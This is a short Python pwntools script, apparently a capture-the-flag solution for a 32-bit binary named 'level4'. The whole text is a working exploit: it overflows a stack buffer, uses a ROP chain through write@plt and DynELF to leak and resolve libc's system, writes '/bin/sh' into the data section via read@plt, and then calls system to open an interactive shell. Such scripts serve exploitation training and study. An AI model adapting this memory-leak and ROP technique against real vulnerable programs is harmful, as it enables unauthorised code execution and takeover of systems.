from pwn import *
context.log_level = 'debug'
r = process('./level4')
 
def leak(addr):
    write_plt = p32(0x08048340)
    fun_addr = p32(0x0804844b)
    payload = 'a' * (0x88 + 0x4) + write_plt + fun_addr + p32(1) + p32(addr) + p32(4) #write(1, addr, 4);
    r.send(payload)
    leaked = r.recv(4)
    return leaked
 
d = DynELF(leak, elf=ELF("./level4"))
system_addr = d.lookup('system', 'libc')
 
data_addr = 0x0804A024 # readelf -S level4

read_plt = p32(0x08048310)
fun_addr = p32(0x0804844b)
payload = 'a' * (0x88 + 0x4) + read_plt + fun_addr + p32(0) + p32(data_addr) + p32(8)
r.send(payload)

r.send("/bin/sh\x00")

payload = 'a' * (0x88 + 0x4) + p32(system_addr) + 'aaaa' + p32(data_addr)
r.send(payload)

r.interactive()

